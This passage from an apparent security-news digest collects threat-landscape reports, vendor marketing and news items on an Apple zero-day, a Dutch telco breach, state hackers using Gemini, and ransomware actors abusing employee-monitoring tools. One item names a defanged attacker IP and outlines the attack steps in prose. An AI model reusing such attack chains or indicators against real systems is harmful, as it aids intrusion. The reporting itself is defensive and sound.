Shocking absolutely no one, we immediately encapsulate actor activity specific to credential access and influence operations via shell commands, Active Directory commands, and PowerShell commands. The conclusive connection is drawn however as threat actors –> targets –> defense industry. Ya think? ;-) In the advisory, see Description of Targets, including defense industry, as well as Initial Access TTPs, including credential guessing and brute force, and finally Post-Compromise TTPs and Exfiltration regarding various shell and AD commands. As a security professional reading this treatise, its reasonable to assume you’ve read a CISA Cybersecurity Advisory before. As such, its also reasonable to assume you’ll agree that knowledge graph generation from a highly dense, content rich collection of IOCs and behaviors is highly useful. I intend to work with my workplace ML team to further incorporate the principles explored herein as part of our context and enrichment generation practices. I suggest you consider the same if you have the opportunity. While SPO triplets, aka semantic triples, are most often associated with search engine optimization (SEO), their use, coupled with LLM power, really shines for threat intelligence applications.

Cheers…until next time.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

Israel-Iran Twelve-Day Conflict | Geopolitical

RedMike Campaign Targets Telecom Infrastructure | State-Sponsored

Chinese Actors Exploit Unpatched Cisco Devices Across 100+ Countries | State-Sponsored

Geopolitical threats and deepfakes

Thailand-Cambodia Border Clashes | Geopolitical

Russian GRU Operations Intensify Against NATO Infrastructure | State-Sponsored

Deepfake-Enabled Fraud Increases 10x Since 2024 | Emerging Technology

289 New Ransomware Variants Identified (33% YoY Increase) | Cybercrime

Synthetic Identity Fraud Up 300% | Emerging Technology

Law Enforcement Disruptions Fragment Criminal Ecosystems | Cybercrime

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

What 2025 teaches us about 2026

The patterns of 2025 point toward a threat environment defined by sustained uncertainty. Security leaders should prepare for:

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

[24] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[25] Cyberscoop - Proofpoint acquires Acuvity to tackle the security risks of agentic AI
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 581 kelime]
Proofpoint announced Thursday it has acquired Acuvity, an AI security startup, as the cybersecurity company moves to address security risks stemming from widespread corporate adoption of agentic AI.

The acquisition strengthens Proofpoint‘s capabilities in monitoring and securing AI-powered systems that are increasingly handling sensitive business functions across enterprises.

Financial terms of the deal were not disclosed, but Ryan Kalember, Proofpoint’s chief strategy officer, told CyberScoop that the acquisition was beyond a pure “technology acquisition,” with Acuvity’s engineering team slated to join the California-based company.

Acuvity specializes in visibility and governance for AI applications, including the ability to track how employees and automated systems interact with external AI services and protect custom AI models developed within organizations. The startup’s platform monitors AI usage across multiple deployments, from web browsers to specialized infrastructure including Model Context Protocol (MCP) servers and locally installed AI tools.

The deal reflects growing concern among enterprises about security gaps created as organizations deploy agentic AI across departments, like software development, customer support, finance, and legal operations. These systems increasingly access sensitive data and execute tasks previously handled exclusively by humans.

Additionally, AI-specific attack vectors such as prompt injection and model manipulation have emerged as potential threats that traditional cybersecurity tools were not designed to address.

Kalember said CISOs are seeing the potential risk combined with agentic AI growth, and are sensing the need to maintain governance without impeding innovation, particularly as the pace of AI adoption has outstripped many companies’ ability to secure these systems effectively.

“It has definitely been a pivot from, ‘I got to be able to stop prompt injection’ to ‘I have to be able to figure out what the AI is even doing,’” he told CyberScoop.

Last May, Proofpoint acquired Hornetsecurity Group, a Germany-based provider of Microsoft 365 security services, in a deal reportedly valued at more than $1 billion. Kalember told CyberScoop he sees Acuvity helping small- and medium-sized organizations that leverage Hornetsecurity’s offerings to boost its AI security.

“That is going to be a world in which, independent of the size of the organization, they are going to very much leverage AI, and some of that will be built into the tools like M365 that is tightly coupled with the Hornetsecurity architecture,” Kalember said.The acquisition follows a theme within the industry where larger security companies are buying AI-focused security startups. Just last week, data security firm Varonis acquired AI security firm AllTrue.ai for $150 million.

[26] Cyberscoop - Apple discloses first actively exploited zero-day of 2026

[TAM METİN - 527 kelime]
Apple disclosed a zero-day vulnerability Wednesday that the vendor warned was previously “exploited in an extremely sophisticated attack against specific targeted individuals,” the company said in a security update.

The memory-corruption vulnerability — CVE-2026-20700 — affects iPhones and iPads and was exploited on devices running versions of iOS before iOS 26. The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Thursday.

The disclosure marks the first zero-day reported by Apple since late 2025, and the first Apple defect flagged as actively exploited by CISA this year.

“An attacker with memory write capability may be able to execute arbitrary code,” the company said.

Apple, which typically shares limited details about in-the-wild exploitation of zero-days, noted the latest zero-day, similar to others it disclosed last year, was exploited by sophisticated attackers targeting distinct people.

The company did not immediately respond to a request for comment and did not describe the nature or objectives of the attacks.

Caitlin Condon, vice president of security research at VulnCheck, said the zero-day was likely exploited as part of a highly targeted spyware or surveillance attack on a very small number of individuals’ devices.

The zero-day vulnerability, which was discovered by Google Threat Intelligence Group, affects dyld, Apple’s open-source dynamic link editor that acts as a core system component to securely load applications on users’ devices.

Apple said a pair of additional vulnerabilities affecting WebKit — CVE-2025-14174 and CVE-2025-43529 — were previously disclosed in response to attacks involving CVE-2026-20700.

The company did not describe how the three vulnerabilities are related, but previously noted CVE-2025-43529 was “exploited in an extremely sophisticated attack against specific targeted individuals.”

All three of the memory-corruption defects affect mobile operating systems, “where sophisticated zero-day attacks are commonly employed to surveil individuals, whether those are political dissidents, journalists, public figures or other high-value targets,” Condon said.

“Memory-corruption exploits are also commonly seen in sophisticated attacks, as they’re tricky to exploit reliably but provide elevated access,” she added.

Apple’s security updates for iOS 26.3 and iPadOS 26.3 addresses 38 vulnerabilities total, but CVE-2026-20700 is the only defect it disclosed as actively exploited prior to public disclosure.

[27] Cyberscoop - Google finds state-sponsored hackers use AI at ‘all stages’ of attack cycle 
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 21:24:46 +0000
Link: https://cyberscoop.com/state-hackers-using-gemini-google-ai/

[TAM METİN - 731 kelime]
A new report from Google found evidence that state-sponsored hacking groups have leveraged AI tool Gemini at nearly every stage of the cyber attack cycle.

The research underscores how AI tools have matured in their cyber offensive capabilities, even as it doesn’t reveal novel or paradigm shifting uses of the technology.

John Hultquist, chief analyst at Google’s Threat Intelligence Group, told CyberScoop that many countries still appear to be experimenting with AI tools, determining where they best fit into the attack chain and provide more benefit than friction.

“Nobody’s got everything completely worked out,” Hultquist said. “They’re all trying to figure this out and that goes for attacks on AI, too.”

But the report also reveals that frontier AI models can build speed, scale and sophistication into a myriad of hacking tasks, and state-sponsored hacking groups are taking advantage.

Gemini was a useful, dynamic and convenient tool for many tasks, helping threat actors in a variety of different ways. In nearly all cases, Google’s reporting suggests that state-sponsored actors relied on Gemini as one tool among many, using it for specific purposes such as automating routine processes, conducting research or reconnaissance and experimenting with malware.

One North Korean group used it to synthesize open-source intelligence about job roles and salary information at cybersecurity and defense companies. Another North Korean group consulted it “multiple days a week” for technical support, using it to troubleshoot problems and generate new malware code when they got stuck during an operation. One Iranian APT used Gemini to “significantly augment reconnaissance” techniques against targeted victims. China, Russia, Iran and North Korea all also used Gemini to create fake articles, personas, and other assets for information operations.

“What’s so interesting about this capability is it’s going to have an effect across the entire intrusion cycle,” Hultquist said.

There are no instances of state groups using Gemini to automate large portions of a cyber attack, like a Chinese-government backed campaign identified by Anthropic last year. It suggests threat actors may still be struggling to implement fully or mostly-automated hacks using AI.

Hultquist said that some state groups, particularly those focused on espionage, may not find the speed and scale advantages of agentic AI useful if it results in louder, more detectable operations. In fact, while state actors continue to experiment with AI models, he believes on average these developments will help smaller cybercriminal outfits more than state-sponsored hackers.

But that could change in the future. Frontier AI companies like Anthropic and cybersecurity startups like XBOW have already developed models with powerful defensive cybersecurity capabilities in vulnerability scanning, reconnaissance and automation. Foreign governments with similar technology could use those same features for offensive hacking, as Chinese actors did with Claude before being discovered.

In December, the UK AI Security Institute’s inaugural report on frontier AI trends found that Al capabilities are improving rapidly across all tested domains, and particularly in cybersecurity.

And the gap between frontier and free, open-source models is shrinking. According to the institute, open-source AI models can now catch up and provide similar capabilities within 4-8 months of a frontier model release.

“The duration of cyber tasks that Al systems can complete without human direction is also rising steeply, from less than 10 minutes in early 2023 to over an hour by mid-2025,” the institute said in its Frontier AI Trends Report in December.

[28] The Register - Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Names, addresses, bank account numbers accessed – but biz insists passwords and call data untouched

The Netherlands' largest mobile network operator (MNO) has admitted that a breach of its customer contact system may have affected around 6.2 million people.

Odido said that attackers gained access to a range of personal data, including names, home and email addresses, phone numbers, dates of birth, bank account numbers, and ID document details.

The telco insisted that attackers could never have seen passwords, call details, billing or location data, or scans of the ID documents.

It spotted the first signals indicating a breach over the weekend of February 7-8 and promptly reported the incident to the Dutch Data Protection Authority.

Odido said the stolen data has not been published, but warned that it could appear online at some point in the future.

Around 6.2 million people were affected by this attack in some way, the telco told local news media, including its own customers and those of Ben, another MNO owned by Odido. Simpel, a low-budget MNO also under Odido's management, was unaffected.

The company is in the process of informing all affected individuals, either via email (info@mail.odido.nl) or SMS. This message will be tailored to each customer, telling them exactly what personal data was stolen.

In its disclosure, Odido also included tips about what customers should be aware of following the breach, such as scams attackers may attempt using the stolen data for financial gain.

Because names, addresses, phone numbers, and bank account numbers were included in the stolen data, Odido said that cybercriminals may use this to impersonate the telco, the customer's bank, or another third party.

Odido also advised customers about the different ways they can verify a caller's identity if they say they're calling from a bank, and to be wary of fake invoices with company branding, trying to get customers to pay the criminals directly.

CEO Søren Abildgaard said Odido "immediately took additional security measures" after shutting down the attacker's access, as well as informing the data regulator.

"Odido has been affected by a cyberattack, in which customer data has been impacted," said Abildgaard in a letter to customers. "This involves personal data originating from a customer contact system used by Odido. No passwords, call details, or billing data are involved.

"We deeply regret this incident and are fully committed to limiting the impact of this incident and providing our customers with all necessary support. It is important to emphasize that our operational services have not been affected; customers can continue to call, use the internet, and watch TV safely.

"Unauthorized access to the system was ended as quickly as possible. In addition, Odido has engaged external cybersecurity experts to support the implementation of additional security measures as part of the response to this incident."

The Register approached Odido for more information. ®

[29] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too
────────────────────────────────────────────────────────────────────────────────
Tarih: 2026-02-12T20:07:13.00Z

Who's the bossware? Ransomware slingers like employee monitoring tools, too

As if snooping on your workers wasn't bad enough

Your supervisor may like using employee monitoring apps to keep tabs on you, but crims like the snooping software even more. Threat actors are now using legit bossware to blend into corporate networks and attempt ransomware deployment.

In late January and early February, the Huntress response team spotted two intrusions in which criminals chained Net Monitor for Employees Professional with remote monitoring and management (RMM) tool SimpleHelp, and then attempted to deploy ransomware on the victims' computers.

While the crims were ultimately unsuccessful, the security incidents highlight how miscreants love to use legitimate, commercial software for nefarious purposes because it makes it easier for them to hide inside enterprise IT environments.

"RMMs and employee monitoring tools blend in amongst legitimate signed binaries," Michael Tigges, senior security operations analyst at Huntress, told The Register, adding that "this is a rare case of the employee monitoring software being co-opted for subsequent access."

While neither of the victims' employers uses Net Monitor, repurposing this type of employee monitoring software falls into the "same category of RMM abuse," Tigges said. "Delineating which may be malicious and benign at first glance is exceedingly difficult. Adversaries know this as well."

The victims, we're told, were from different industry sectors, and "likely targets of opportunity rather than any specifically targeted group," he added.

This is a rare case of the employee monitoring software being co-opted for subsequent access

Tigges points out that "there are legitimate use cases for employee monitoring software - chiefly around data loss prevention."

This particular brand of bossware, however, does a whole lot more than passive screen monitoring. It can also establish remote shell connections and remotely execute commands on users' desktops. That makes it ideal for crims to use, even without modifying or infecting the installers.

"Threat actors leveraged this capability for hands-on-keyboard reconnaissance, additional tooling delivery, and deploying secondary remote access channels, effectively turning an employee monitoring tool into a fully functional RAT (remote access trojan)," Tigges and fellow threat hunters Anna Pham, Dray Agha, and Anton Ovrutsky wrote in a Wednesday blog.

As The Register previously reported, spying on workers is also bad for morale and doesn't inspire loyalty to the company, not to mention that employer-sanctioned RATs are creepy as all hell.

Here's what went down

In the first case that the Huntress team observed in late January, the attacker somehow installed Net Monitor for Employees on the victim's machine. Huntress doesn't know how the intruder gained initial access.

But once they had broken in, the criminals set to work manipulating user accounts via multiple net commands. This included attempting to identify valid usernames, reset passwords, and create new admin-user accounts on the host.

"As we kept pulling on investigative threads, we observed the 'Net Monitor for Employees' terminal pulling down a file via PowerShell named vhost.exe from the IP address of 160.191.182[.]41," the threat hunters wrote.

The executable turned out to be SimpleHelp, which the attacker then used in multiple attempts to tamper with Windows Defender. When this wasn't successful, the intruder tried to deploy multiple versions of Crazy ransomware linked to VoidCrypt.

In the second incident, which happened in early February, the attacker used a compromised third-party SSL VPN account to gain initial access to the victim's computer. Next, they connected to a domain controller using remote desktop protocol, launched a PowerShell session, and installed the Net Monitor agent, configuring the reverse connection to call back to an attacker-controlled console.

Net Monitor allows users to customize the service and process names, and the intruder took advantage of this to disguise the agent as Microsoft OneDrive, registering the service as OneDriveSvc, naming the process OneDriver.exe, and renaming the running binary to svchost.exe.

Then, the intruder installed SimpleHelp and configured it to monitor for keywords that would indicate cryptocurrency wallets, exchanges, blockchain explorers, and payment platforms. This, Huntress notes, indicates "the threat actor's financial motivation extends beyond ransomware to direct cryptocurrency theft."

The SimpleHelp agent also monitored for remote tool access keywords including RDP, AnyDesk, TeamViewer, and VNC.

Meanwhile, they used Net Monitor for Employees Professional to perform network reconnaissance on the compromised domain controller, probe internal network segments, and map out the network settings.

Huntress says shared infrastructure used in both cases, plus the reuse of the vhost.exe filename and overlapping IP addresses, "strongly suggest" a single attacker or group behind the two intrusions.

And to prevent becoming the next victim, turn on multi-factor authentication (MFA) on all remote access services and external-facing applications, and limit remote access to only those users and systems that require it to do their jobs.

The security analysts also suggest conducting regular audits of all third-party RMM tools and employee monitoring software, and monitoring for any unusual process execution chains. ®

[30] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®
